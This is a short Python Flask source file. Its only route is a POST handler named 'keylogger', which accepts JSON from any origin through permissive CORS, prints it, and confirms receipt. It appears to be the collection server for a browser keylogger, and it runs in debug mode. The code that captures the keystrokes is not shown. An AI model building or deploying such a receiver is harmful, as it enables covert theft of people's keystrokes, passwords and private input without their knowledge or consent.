from flask import Flask, request, jsonify
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

@app.route("/", methods=['POST'])
def keylogger():
    if request.method == 'POST':
        data = request.json        
        print(data)
        return jsonify({'message': 'Received data successfully'}), 200

if __name__ == '__main__':
    app.run(debug=True)
